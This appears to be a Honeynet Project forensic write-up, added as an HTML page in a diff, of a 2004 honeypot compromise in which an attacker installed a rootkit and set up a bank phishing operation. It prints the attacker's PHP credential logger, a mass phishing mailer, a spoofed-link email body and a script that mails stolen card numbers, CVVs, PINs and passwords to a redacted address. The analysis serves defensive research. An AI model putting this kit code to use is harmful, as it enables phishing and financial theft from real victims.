@@ -1,0 +1,296 @@
+<html>
+<head>
+<title>Know Your Enemy: Phishing</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="../phishing.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+<div id="header">
+	<h1>Know Your Enemy:<br>Phishing</h1>
+	<h3 id="subtitle">Detailed analysis of first incident at German Honeynet
+		Project</h3>
+	<p id="metainfo">
+  <a href="mailto:project@honeynet.org?Subject=Know%20Your%20Enemy">The Honeynet
+		Project &amp; Research Alliance</a><br>
+  <a href="http://www.honeynet.org/">http://www.honeynet.org</a><br>
+  Last Modified: 15 May 2005
+</p>
+</div>
+
+
+On <strong>November 12, 2004</strong>, the Honeynet was connected to the
+Internet. During the time between the start up and <strong>November
+22</strong>, nothing special happened.  We just observed an enormous number of
+packets with destination port 445 which is not critical for the installed
+Honeypot.
+
+<p>
+<a name="rootkit">At</a> <strong>1:16 am</strong> the Honeypot got compromised by <a
+	href="http://www.securityfocus.com/bid/3581/">exploiting</a> the WU-FTP
+daemon. There was no port scan or FTP connection before, the first connect was
+used to hack the computer which is an indication of an <i>autorooter</i>-tool.
+Such tools are used to scan whole network ranges for vulnerable machines and
+attack everything they come across. They just deliver their &quot;evil&quot;
+payload to every system in the given address range.  In our case, it was
+probably a tool called <code>superwu</code> since later on, the attacker used
+this tool to attack further targets from the Honeypot. 
+
+<p>
+Until <strong>8:21 am</strong> there was no activity from the attacker. Probably
+he started the tool the night before and checked in the morning for successful
+gained access.  As a first step he downloaded a rootkit
+and installed it on the Honeypot.  This script-based rootkit replaces some
+system binaries with trojaned files:</p>
+
+<p>
+<div align="center">
+  <table width="75%" border="0" bordercolor="#FFFFFF" bgcolor="#FFFFFF">
+    <tr>
+      <td>/usr/bin/dir</td>
+      <td>/usr/bin/top</td>
+      <td>/bin/ps</td>
+    </tr>
+
+    <tr>
+      <td>/sbin/ifconfig</td>
+      <td>/usr/bin/slocate</td>
+      <td>/usr/bin/pstree</td>
+    </tr>
+    <tr>
+      <td>/bin/netstat</td>
+      <td>/usr/bin/vdir</td>
+      <td>/usr/bin/socklist</td>
+    </tr>
+    <tr>
+      <td>/usr/bin/strings</td>
+      <td>/usr/bin/chattr</td>
+      <td>/usr/sbin/lsof </td>
+    </tr>
+  </table>
+</div>
+
+<p>In addition, it install an SSH-daemon on port 255 which was used by the
+attacker to log on the Honeypot in the following.
+
+The rootkit uses source code to compile new versions of binary files. These
+trojaned executables are adjusted to the size of the original files of the
+target system to &quot;hide&quot; the presence. The rootkit also installs a
+sniffer to collect login information to other systems. Furthermore, it modifies
+the init-scripts to ensure that the installed services will start on next
+reboot and then sends out an information mail about the system status to the
+attacker. After finishing the installation, the attacker reentered the Honeypot
+via the additionally installed SSH service using the tool &quot;putty&quot;, an
+SSH-Client for Windows-systems.
+Afterwards the attacker downloaded a file called <i>spam.tgz</i>. This
+archive contains some PHP and HTML files. Further examination showed that these
+files contain web-pages to update the billing profile update for seller accounts
+of a large Internet auctions website.
+The attacker copied this files into the document root of the
+webserver. The &quot;index.html&quot; start page is a forwarding page to
+the auctions website. The reason for that is that these PHP pages were incomplete. The
+attacker edited them, but never finished his work on this files.
+By tracing the IP of the attacker, the source could be located in Romania. A
+scan of this computer showed no open ports, so this could be the computer of
+the cracker. 
+
+<p>
+At<strong> 8:49 am</strong> the attacker downloaded another file:
+<i>psybnc.tgz</i>.  After extracting the archive, he installed the included
+IRC-Bouncer and started an IRC-Session to an &quot;undernet.org&quot; server.
+The channel he entered was probably used to control hacked systems. A scan of
+all 8 connected clients showed the same untypical open port 255 with a listening
+SSH-daemon like the Honeypot had. The attacker also entered another channel and
+received Operator-rights there. The topic on this channel was a pointer to his
+personal homepage and the language used in that channel was Romanian.
+
+<p>
+At<strong> 6:25 pm</strong> the attacker came back and downloaded the file
+<i>windmilk.tgz</i>. This archive contains the &quot;superwu&quot; autorooter.
+After extracting the executable binary file, he started the exploiter in a
+screen-session with a target network as parameter. Then the attacker detached
+the session and logged off. Later when he came back, he attached the session
+again to see the results.  Since the Honeywall blocked all attacks, no systems
+could be compromised.  The attacker did not realize the intervention,
+downloaded and installed at <strong>10:40 pm</strong> a &quot;socksify&quot;
+proxy which was configured without any restrictions.  
+With this service anybody could use the Honeypot as a proxy for spreading spam
+or anonymous connections to any other systems. During the honeynet's online
+time, it was never used. 
+
+<p>
+On <strong>November 23, 2004, </strong>the attacker came back at <strong>2:25
+pm</strong>. He added the user &quot;ro&quot; and installed another rootkit. In a
+side note we present the <a href="./de-honeynet_files/phishing-snort.html">recording of this
+session</a> captured by the snort binary logging.<br />
+
+<p>
+At <strong>4:40 pm</strong>, the attacker downloaded the archive
+<i>willson.tgz</i>.  This file includes already finished webpages
+similar to the <i>spam.tgz</i> archive. The attacker installed them in the
+document root directory of the webserver.  Now this Honeypot could be
+used for phishing attacks. 
+By calling the startup page, you get a login page that looks like the
+original login page.  While unrelated to the incident we report, a
+recent example illustrating the similarity of a phishing data entry form
+to compare to the acutal site can be 
+<a href="http://www.antiphishing.org/phishing_archive/05-10-05_Paypal/05-10-05_Paypal.html">
+found here</a>.
+
+
+<p>The input of this form will be rudimentary checked with the help of a small
+PHP-script<br />
+
+<pre>
+<em>&lt;?php
+//chk:
+if(strlen($userid)&lt;1 || strlen($pass)&lt;1) {
+	echo 'Invalid user/password';
+}
+else {
+	$mesaj = &quot;$userid $pass&quot;;
+	header (&quot;Location:verify.html&quot;);
+	$muie = fopen(&quot;/tmp/User.doc&quot;, &quot;w&quot;);
+	fwrite($muie, $mesaj);
+	fclose($muie);
+	exit();
+}
+?&gt;</em>
+</pre>
+
+For both input fields (username and password), the input must be longer
+than one character. Note the use of the strings <i>$mesaj</i> and <i>$muie</i>,
+which suggests a Romanian connection and have been observed in other incidents
+analysed by members of the UK Honeynet Project.  If the input is okay, it will
+be written to the file <code>/tmp/User.doc</code> and the next page will be
+shown.  On this page, the victim is tricked into entering personal information. All
+input will be checked and if one is not according to the condition, an error
+page will be shown. This error page does not attempt to mimic the real 
+error page and most victims would likely become suspicious of the fake web site
+at this point. 
+
+</p>
+
+<p>With the help of the <a href="./de-honeynet_files/phishing-validation.html">following
+validation script</a>, the data entered into the form is checked.
+The resulting page of the validation process is not interpreted by the
+webserver because Apache does not accept <code>.dll</code> files as PHP files
+by default. The attacker forgot to set the &quot;AddType&quot; variable of the
+Apache server to interpret <code>.dll</code> files with the PHP-engine.<br />
+The next activity of the attacker was downloading an archive called
+<i>banksend.tgz</i>.  This file includes a PHP script for sending mails:
+
+<pre>
+  <em>&lt;?php
+  include(&quot;ini.inc&quot;);
+  $mail_header = &quot;From: support@Bank.com&lt;support@Bank.com&gt;\n&quot;;
+  $mail_header .= &quot;Content-Type: text/html\n&quot;;
+  $subject=&quot;Bank Security Department &quot;;
+  $body=loadini(&quot;test.txt&quot;);
+  if (!($fp = fopen(&quot;list.txt&quot;, &quot;r&quot;)))
+  	exit(&quot;Unable to open $listFile.&quot;);
+  $i=0;
+  print &quot;Start time is &quot;; print date(&quot;Y:m:d H:i&quot;); print &quot;\n&quot;;
+  while (!feof($fp)) {
+  	fscanf($fp, &quot;%s&quot;, $name);
+  	$i++;
+  	mail($name, $subject, $body, $mail_header);
+  }
+  print &quot;End time is &quot;; print date(&quot;Y:m:d H:i&quot;); print &quot;\n&quot;;
+  print &quot;$i&quot;; print &quot;emails sent.&quot;; print&quot;\n&quot;;
+  ?&gt;</em>
+
+</pre>
+
+<a name="mm">After downloading</a> the <i>test.txt</i> file which contained 3719 e-mail
+addresses, the attacker started sending phishing mails to the recipients listed
+in this file.  The source code of this file shows the real target of the comprised link:
+
+<p>
+<br />
+<br>
+<em> Please follow the link below and renew your account information. <br />
+
+&lt;br&gt;&lt;br&gt;<br />
+<br />
+&lt;a href=&quot;<strong>http://XXX.XXX.XXX.XXX/Checking/login.php</strong>&quot;
+<br />
+onClick=&quot;popup('http://www.totalmates.com/php/click.cgi?id=xakir')&quot;
+<br />
+onMouseOver=&quot;window.status='https://internetbanking.bank.com';return
+true;&quot; <br />
+onMouseOut=&quot;window.status=' ';return 
+true;&quot;&gt;https://internetbanking.bank.com&lt;/a&gt;<br />
+
+&lt;br&gt;<br />
+&lt;br&gt;</em><br />
+<br />
+</p>
+
+<p> At this point of time we decided to block outgoing TCP ports 25 and 443 so
+that no victim would suffer from the phishing attacks.
+The attacker probably noticed that we blocked outgoing connections and concluded
+that something weird was happening.  He never came back and on <strong>Decembers
+8, 2004</strong>, the honeynet went offline for further analysis. 
+
+<p>
+<strong>What else did we find?</strong> </p>
+
+<p> We found archives which contained pre-packaged pages for other major banks.
+These pages are used for gathering credit card numbers from the victims.  
+For example, in one case the form input will be checked with the help of 
+JavaScript and the only condition is that the input fields are not blank.
+The next script sends the data to the attacker:
+
+<pre>
+  <em>&lt;?php
+  session_start();
+  $log0 = $_POST['CARD_NUMBER'];
+  $log1= $_POST['CVV2'];
+  $log2 = $_POST['MOTHERS_MAIDEN_NAME'];
+  $log3 = $_POST['EMAIL'];
+  $log4 = $_POST['nmc'];
+  $log5 = $_POST['addr'];
+  $log6 = $_POST['cd'];
+  $log7 = $_POST['pin'];
+  $log8 = $_POST['country'];
+  $log9 = $_POST['city'];
+  $log10 = $_POST['state'];
+  $log11 = $_POST['exp'];
+  $log12 = $_POST['user'];
+  $log13 = $_POST['password'];
+  $log14 = $_POST['bankname'];
+  $log15 = $_POST['bankrouting'];
+  $log16 = $_POST['checkingaccount'];
+  $log17 = $_POST['bankacc'];
+  $td = date(&quot;F jS&quot;);
+  $date = date(&quot;d M, Y&quot;);
+  $time = date(&quot;g:i a&quot;);
+  $LogTime = trim(&quot; Date: &quot;.$date.&quot;, Time: &quot;.$time );
+  mail(&quot;<font color="#FF0000">XXXXXX</font>@yahoo.com&quot;, &quot;Bank Results&quot;, &quot;$log0\n$log1\n$log2\n$log3\n$log4\n$log5\n$log6\n
+	$log7\n$log8\n$log9\n$log10\n$log11\n$log12\n$log13\n$log14\n$log15\n$log16\n$log17&quot;);
+
+  header (&quot;Location: proccessing.html&quot;);
+  exit;
+  ?&gt;
+
+</em>
+</pre>
+ 
+After this validation, the file <i>processing.html</i> shows just the text:
+&quot;Thank you, Our update team will verify provided information and you will
+be contacted&quot;.
+In another bank page, we found the input will not be checked for reasonable 
+values. Instead, it will be just send
+to the attacker by mail after using the &quot;Save&quot; button. 
+Furthermore, we found a mailer-script for a US bank which works like the
+mailer-script. It is a simple PHP script that reads e-mail
+addresses from a separate file and sends the contents of another file. The
+recipient file includes 83,073 mail addresses.</p>
+
+<p align="center"><a href="http://www.honeynet.org/"><img src="../images/small.gif"
+	alt="The Honeynet Project" width="143" height="34" border="0"></a> </p>
+
+<p>&nbsp; </p>
+</body>
+</html>
